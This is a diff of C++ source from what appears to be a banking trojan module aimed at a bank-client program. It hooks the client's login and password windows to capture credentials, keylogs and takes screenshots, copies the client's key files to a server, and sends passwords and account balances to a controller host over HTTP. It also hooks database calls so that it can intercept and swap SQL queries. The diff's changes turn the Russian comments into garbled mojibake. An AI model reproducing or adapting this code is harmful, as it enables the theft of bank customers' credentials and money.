+	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 2-пїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ "\0\0"
 	if( Directory::IsExists(tempFolder) ) DeleteFolders(tempFolder);
 	pCreateDirectoryA( tempFolder, 0 );
-	DBG( "Tiny", "Копирование во временную папку %s", tempFolder );
+	DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s", tempFolder );
 	*((int*)&(folderTiny[ m_lstrlen(folderTiny) ])) = 0; 
 	CopyFileANdFolder( folderTiny, tempFolder );
-	DBG( "Tiny", "Копирование на сервер" );
-	//удаляем ненужные папки
+	DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ" );
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 /*
 	const char* DelFolders[] = { "DATA", "OldVersion", 0 };
 	int i = 0;
@@ -275,7 +286,7 @@ DWORD WINAPI SendTiny(LPVOID)
 	{
 		pPathAppendA( tempFolder, DelFolders[i] );
 		*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
-		DBG( "Tiny", "Удаление папки %s", tempFolder );
+		DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s", tempFolder );
 		DeleteFolders(tempFolder);
 		pPathRemoveFileSpecA(tempFolder);
 		i++;
@@ -284,14 +295,14 @@ DWORD WINAPI SendTiny(LPVOID)
 	VideoProcess::SendFiles( 0, clientPrg, tempFolder );
 	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
 	DeleteFolders(tempFolder);
-	DBG( "Tiny", "Копирование на сервер окончено" );
+	DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 	return 0;
 }
 
 static int GetNameBank( char* bank, int szBank )
 {
-	char MyIdBank[32]; //код банка 
-	char Name[81]; //имя банка из базы
+	char MyIdBank[32]; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 
+	char Name[81]; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ
 	bank[0] = 0;
 	int ret = 0;
 	if( bankClient[0] )
@@ -327,7 +338,7 @@ static int GetNameBank( char* bank, int szBank )
 
 static DWORD WINAPI SendBalance( InfoAccount* ia )
 {
-	DBG( "Tiny", "Отсылка баланса: %ls, %I64d, '%ls'", ia->account, ia->balance, ia->name );
+	DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ: %ls, %I64d, '%ls'", ia->account, ia->balance, ia->name );
 	string Host = GetAzHost();
 	if(!Host.IsEmpty())
 	{
@@ -339,10 +350,10 @@ static DWORD WINAPI SendBalance( InfoAccount* ia )
 		char* urlNameBank = URLEncode(nameBank);
 		char balance[16];
 		pwsprintfA( balance, "%d.%d", int(ia->balance / 10000), int((ia->balance % 10000)) / 100 );
-		//формируем запрос
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		//pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=getdrop&sum=%s&acc=%s", urlAdmin, Bot->UID.t_str(), azUser.t_str(), balance, account );
 		pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s&w=1", Host.t_str(), BOT_UID, GetAzUser().t_str(), balance, account, urlNameBank);
-		DBG( "Tiny", "Отправляем запрос %s", qr.AsStr() );
+		DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ %s", qr.AsStr() );
 		THTTP H;
 		H.Get(qr.AsStr());
 		STR::Free(account);
@@ -351,7 +362,7 @@ static DWORD WINAPI SendBalance( InfoAccount* ia )
 	return 0;
 }
 
-//отсылка текущего баланса для старого клиента
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static DWORD WINAPI SendBalanceOld( void* )
 {
 	ODBC* DB = OpenDB();
@@ -371,17 +382,17 @@ static DWORD WINAPI SendBalanceOld( void* )
 			int i = 0;
 			for( i = 0; i < ARRAYSIZE(accountClient) - 1 && accountClient[i].account[0]; i++ )
 			{
-				if( !m_wcsncmp( account, accountClient[i].account, len ) ) //такой счет есть в массиве
+				if( !m_wcsncmp( account, accountClient[i].account, len ) ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				{
 					currAccount = i;
 					break;
 				}
 			}
-			if( currAccount < 0 ) //в массиве нет такого счета
+			if( currAccount < 0 ) //пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			{
-				if( i < ARRAYSIZE(accountClient) - 1 ) //есть еще место в массиве
+				if( i < ARRAYSIZE(accountClient) - 1 ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				{
-					//добавляем счет
+					//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 					m_wcsncpy( accountClient[i].account, account, len + 1 );
 					accountClient[i + 1].account[0] = 0;
 					currAccount = i;
@@ -407,7 +418,7 @@ static DWORD WINAPI SendBalanceOld( void* )
 
 static DWORD WINAPI SendPassword( void* )
 {
-	DBG( "Tiny", "Отсылка пароля %s", passwordClient );
+	DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ %s", passwordClient );
 	string Host = GetAzHost();
 	if(!Host.IsEmpty())
 	{
@@ -419,7 +430,7 @@ static DWORD WINAPI SendPassword( void* )
 		TMemory qr(512);
 		string azUser = GetAzUser();
 		pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=setlog&log=00&text=%s", Host.t_str(), BOT_UID, azUser.t_str(), urlText );
-		DBG( "Tiny", "Отправляем запрос %s", qr.AsStr() );
+		DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ %s", qr.AsStr() );
 		THTTP H;
 		H.Get(qr.AsStr());
 		STR::Free(urlText);
@@ -454,7 +465,7 @@ static void AddStrLog( const char* name, const char* value, char* resultGrab )
 
 static void GrabKeys()
 {
-	//берем в базе данных путь к ключам
+	//пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	ODBC* db = OpenDB();
 	if( db )
 	{
@@ -465,16 +476,16 @@ static void GrabKeys()
 		if( qr )
 		{
 			db->CloseQuery(qr);
-			DBG( "Tiny", "Путь к ключам '%s'", pathKeys );
+			DBG( "Tiny", "пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ '%s'", pathKeys );
 			KeyLogger::AddDirectory( pathKeys, "keys" );
 			VideoProcess::SendFiles( 0, "keys_tiny", pathKeys, 0, 0, true );
 		}
 		else
-			DBG( "Tiny", "Путь к ключам в базе данных не найден" );
+			DBG( "Tiny", "пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ" );
 		CloseDB(db);
 	}
 	else
-		DBG( "Tiny", "Не удалось открыть базу %s", pathMDB );
+		DBG( "Tiny", "пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ %s", pathMDB );
 }
 
 static DWORD SendGrabData( ForFindControl* ffc )
@@ -483,8 +494,8 @@ static DWORD SendGrabData( ForFindControl* ffc )
 	resultGrab.AsStr()[0] = 0;
 	int ilogin = 0;
 	int imdb = 1;
-	//в новом клиента логин находится в 0-м поле, в старом в 1-м, по длине текста
-	//определяем что откуда брать
+	//пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ 0-пїЅ пїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ 1-пїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if( m_lstrlen(ffc->texts[0]) > m_lstrlen(ffc->texts[1]) )
 	{
 		ilogin = 1;
@@ -501,7 +512,7 @@ static DWORD SendGrabData( ForFindControl* ffc )
 	for( int i = 0; i < ffc->count; i++ ) STR::Free( ffc->texts[i] );
 	MemFree(ffc);
 	GrabKeys();
-	pSleep(2000); //ждем немного и закрываем систему
+	pSleep(2000); //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 //	DWORD unhook[]  = { 0xEB4A6DB3 /* DestroyWindow */, 0 };
 //	RestoreFuncs( DLL_USER32,  unhook );
@@ -522,7 +533,7 @@ static DWORD SendGrabPassword( ForFindControl* ffc )
 	for( int i = 0; i < ffc->count; i++ ) STR::Free( ffc->texts[i] );
 	MemFree(ffc);
 	GrabKeys();
-	pSleep(2000); //ждем немного и закрываем систему
+	pSleep(2000); //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 //	DWORD unhook[]  = { 0xEB4A6DB3 /* DestroyWindow */, 0 };	
 //	RestoreFuncs( DLL_USER32,  unhook );
@@ -548,12 +559,12 @@ static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
 }
 
 /////////////////////////////////////////////////////////////////////
-// Хуки
+// пїЅпїЅпїЅпїЅ
 /////////////////////////////////////////////////////////////////////
 
 static void* GetInterfaceFunc( void* This, int num )
 {
-	DWORD* pv = (DWORD*)*((DWORD*)This); //извлекаем указатель на интерфейс
+	DWORD* pv = (DWORD*)*((DWORD*)This); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	return (void*)pv[num];
 }
 
@@ -562,7 +573,7 @@ static BOOL WINAPI HandlerDestroyWindow( HWND hwnd )
 	DWORD hash = GetWndClassHash(hwnd);
 	if( HashTfAuthNew == hash )
 	{
-		DBG( "Tiny", "Закрытие окна регистрации" );
+		DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		ForFindControl* ffc = (ForFindControl*)MemAlloc(sizeof(ForFindControl));
 		ffc->count = 0;
 		ffc->hashs = GrabControls;
@@ -572,20 +583,20 @@ static BOOL WINAPI HandlerDestroyWindow( HWND hwnd )
 	}
 	else if( HashTPasswordDlg == hash )
 	{
-		DBG( "Tiny", "Закрытие окна ввода пароля" );
+		DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ" );
 		ForFindControl* ffc = (ForFindControl*)MemAlloc(sizeof(ForFindControl));
 		ffc->count = 0;
 		ffc->hashs = GrabControls;
 		pEnumChildWindows( hwnd, EnumChildProc, ffc );
-		if( ffc->count >= 3 ) //для старого клиента
+		if( ffc->count >= 3 ) //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			RunThread( SendGrabData, ffc );
 		else
-			if( ffc->count >= 1 ) //для нового клиента
+			if( ffc->count >= 1 ) //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				RunThread( SendGrabPassword, ffc );
 	}
-	else if ( HashTKeyPasswordDlg == hash ) //может быть только в старом клиенте
+	else if ( HashTKeyPasswordDlg == hash ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
-		DBG( "Tiny", "Закрытие окна ввода пароля для ключей" );
+		DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ" );
 		ForFindControl* ffc = (ForFindControl*)MemAlloc(sizeof(ForFindControl));
 		ffc->count = 0;
 		ffc->hashs = GrabControls;
@@ -699,7 +710,7 @@ static HRESULT __stdcall HandlerRecordset_Open( void* This, VARIANT Source, VARI
 				void* realFuncs[] = {&RealField_get_Value};
 				if( ReplacementFuncs( &item, nums, handlerFuncs, realFuncs, 1 ) )
 				{
-//					DBG( "Tiny", "Подменили Field_get_Value" );
+//					DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Field_get_Value" );
 				}
 			}
 		}
@@ -710,36 +721,36 @@ static HRESULT __stdcall HandlerRecordset_Open( void* This, VARIANT Source, VARI
 static int ExecSQLFilter( wchar_t* newSQL )
 {
 	int ret = 0;
-	m_wcslwr(newSQL); //запрос в нижний регистр
+	m_wcslwr(newSQL); //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int i = 0;
 	while( filtersSQL[i].func )
 	{
 		bool ok = true;
-		if( filtersSQL[i].and ) //слова которые должны быть в запросе
+		if( filtersSQL[i].and ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		{
 			int j = 0;
 			const WCHAR* p = newSQL;
 			while( filtersSQL[i].and[j] )
 			{
-				int l = m_wcslen( &filtersSQL[i].and[j] ); //длина очередного слова
-				p = m_wcsstr( p, &filtersSQL[i].and[j] ); //есть слово в запросе
-				if( p == 0 ) //фильтр не сработал
+				int l = m_wcslen( &filtersSQL[i].and[j] ); //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+				p = m_wcsstr( p, &filtersSQL[i].and[j] ); //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+				if( p == 0 ) //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				{
 					ok = false;
 					break;
 				}
 				p += l;
-				j += l + 1; //переходим на очередное слово
+				j += l + 1; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			}
 		}
-		if( ok && filtersSQL[i].not ) //слова которых не должно быть в запросе
+		if( ok && filtersSQL[i].not ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		{
 			int j = 0;
 			while( filtersSQL[i].not[j] )
 			{
 				int l = m_wcslen( &filtersSQL[i].not[j] );
 				const WCHAR* p = m_wcsstr( newSQL, &filtersSQL[i].not[j] );
-				if( p ) //такое слово есть, фильтр не сработал
+				if( p ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				{
 					ok = false;
 					break;
@@ -747,21 +758,21 @@ static int ExecSQLFilter( wchar_t* newSQL )
 				j += l + 1;
 			}
 		}
-		if( ok ) //фильтр сработал, вызваем его функцию
+		if( ok ) //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		{
 			int len = m_wcslen(newSQL);
 			int res = filtersSQL[i].func( newSQL, len );
-			if( res == 1 ) //оставить запрос как есть
+			if( res == 1 ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			{
 				break;
 			}
 			else
-				if( res == 2 ) //подменить запрос
+				if( res == 2 ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 				{
 					ret = 1;
 					break;
 				}
-			//если res == 0, то поиск продолжается
+			//пїЅпїЅпїЅпїЅ res == 0, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		}
 		i++;
 	}
@@ -771,15 +782,15 @@ static int ExecSQLFilter( wchar_t* newSQL )
 static HRESULT __stdcall HandlerCommand_put_CommandText( void* This, BSTR pbstr )
 {
 	DBG( "Tiny", "Command_put_CommandText: '%ls'", pbstr );
-	//выделяем место и копируем запрос
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	int len = m_wcslen(pbstr);
-	int size = (2 * len + 1) * sizeof(WCHAR); //выделяем в два раза больше памяти, чтобы функция фильтра могла изменить запрос
+	int size = (2 * len + 1) * sizeof(WCHAR); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	WCHAR* newSQL = (WCHAR*)MemAlloc(size);
 	if( newSQL )
 	{
 		m_wcsncpy( newSQL, pbstr, len );
 		newSQL[len] = 0;
-		if( ExecSQLFilter(newSQL) ) //если возвращает 1, то нужно подменить
+		if( ExecSQLFilter(newSQL) ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 1, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			pbstr = newSQL;
 	}
 	HRESULT hr = RealCommand_put_CommandText( This, pbstr );
@@ -789,16 +800,16 @@ static HRESULT __stdcall HandlerCommand_put_CommandText( void* This, BSTR pbstr 
 
 static bool ReplacementFuncs( void** ppv, int* nums, void** handlerFuncs, void** realFuncs, int count )
 {
-	DWORD* pv = (DWORD*)*(*(DWORD**)ppv); //извлекаем указатель на интерфейс
+	DWORD* pv = (DWORD*)*(*(DWORD**)ppv); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD* phf = (DWORD*)handlerFuncs;
 	DWORD** prf = (DWORD**)realFuncs;
 	if( pv[ nums[0] ] == phf[0] )
-		return true; //подмена уже была
-	//вычисляем размер памяти с которой нужно снять защиту от записи
+		return true; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	int max = 0;
 	for( int i = 0; i < count; i++ ) 
 		if( max < nums[i] ) max = nums[i];
-	int sizeMem = sizeof(DWORD) * (max + 1); //размер памяти с которой нужно снять защиту от записи
+	int sizeMem = sizeof(DWORD) * (max + 1); //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	DWORD oldProtect = 0;
 	if( (BOOL)pVirtualProtect( pv, sizeMem, PAGE_EXECUTE_READWRITE, &oldProtect ) )
@@ -818,7 +829,7 @@ static HRESULT STDAPICALLTYPE HandlerCoCreateInstance( REFCLSID rclsid, LPUNKNOW
 //	ToHex( buf2, (BYTE*)&riid, sizeof(IID) );
 //	DBG( "Tiny", "rclsid=%s, riid=%s", buf1, buf2 );
 	HRESULT hr = RealCoCreateInstance( rclsid, pUnkOuter, dwClsContext, riid, ppv );
-	//запрашивается интерфейс базы данных
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if( SUCCEEDED(hr) )
 	{
 		if( m_memcmp( &rclsid, &IID_Connection, sizeof(IID) ) == 0 ) 
@@ -828,7 +839,7 @@ static HRESULT STDAPICALLTYPE HandlerCoCreateInstance( REFCLSID rclsid, LPUNKNOW
 			void* realFuncs[] = {&RealConnection_Open};
 			if( ReplacementFuncs( ppv, nums, handlerFuncs, realFuncs, 1 ) )
 			{
-//				DBG( "Tiny", "Подменили Connection_Open" );
+//				DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Connection_Open" );
 			}
 		}
 		else if ( m_memcmp( &rclsid, &IID_Recordset, sizeof(IID) ) == 0 ) 
@@ -838,7 +849,7 @@ static HRESULT STDAPICALLTYPE HandlerCoCreateInstance( REFCLSID rclsid, LPUNKNOW
 			void* realFuncs[] = {&RealRecordset_Open};
 			if( ReplacementFuncs( ppv, nums, handlerFuncs, realFuncs, 1 ) )
 			{
-//				DBG( "Tiny", "Подменили Recordeset_Open" );
+//				DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Recordeset_Open" );
 			}
 		}
 		else if ( m_memcmp( &rclsid, &IID_Command, sizeof(IID) ) == 0 ) 
@@ -848,7 +859,7 @@ static HRESULT STDAPICALLTYPE HandlerCoCreateInstance( REFCLSID rclsid, LPUNKNOW
 			void* realFuncs[] = {&RealCommand_put_CommandText};
 			if( ReplacementFuncs( ppv, nums, handlerFuncs, realFuncs, 1 ) )
 			{
-//				DBG( "Tiny", "Подменили Command_put_CommandText" );
+//				DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Command_put_CommandText" );
 			}
 		}
 	}
@@ -893,14 +904,14 @@ static SQLRETURN WINAPI HandlerSQLExecDirectA( SQLHSTMT StatementHandle, SQLCHAR
 
 ///////////////////////////////////////////////////////////////////////////////
 
-//активация при регистариции
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 void Activeted(LPVOID Sender)
 {
 	DBG( "Tiny", "Activated" );
 //	SetHooks();
 }
 
-//активация при вводе пароля
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 void Activeted2(LPVOID Sender)
 {
 	DBG( "Tiny", "Activated2" );
@@ -912,17 +923,17 @@ bool Init( const char* appName )
 	PKeyLogSystem S = KeyLogger::AddSystem( "tiny", PROCESS_HASH );
 	if( S == 0 ) 
 	{
-		S = KeyLogger::AddSystem( "tiny", PROCESS_HASH2 ); //старый клиент
+		S = KeyLogger::AddSystem( "tiny", PROCESS_HASH2 ); //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		HashCurrProcess = PROCESS_HASH2;
 	}
 	else
 		HashCurrProcess = PROCESS_HASH;
 	if( S != NULL )
 	{
-		DBG( "Tiny", "Регистрация системы" );
+		DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		SetHooks2();
 		m_lstrcpy( folderTiny, appName );
-		pPathRemoveFileSpecA(folderTiny); //папка с прогой
+		pPathRemoveFileSpecA(folderTiny); //пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		S->MakeScreenShot = true;
 		S->SendLogAsCAB = true;
 		char* classWnd = "TfAuthNew";
@@ -931,8 +942,8 @@ bool Init( const char* appName )
 		{
 			F1->OnActivate = Activeted;
 		}
-		//в новом клиенте в это окно вводится только пароль
-		//в старом клиенте идет идентификация как в TfAuthNew нового клиента
+		//пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+		//пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ TfAuthNew пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		char* classWnd2 = "TPasswordDlg"; 
 		PKlgWndFilter F2 = KeyLogger::AddFilter(S, true, true, classWnd2, 0, FILTRATE_PARENT_WND, LOG_ALL, 5);
 		if( F2 )
@@ -940,7 +951,7 @@ bool Init( const char* appName )
 			F2->OnActivate = Activeted2;
 		}
 
-		char* classWnd3 = "TKeyPasswordDlg"; //сработает только в старом клиенте
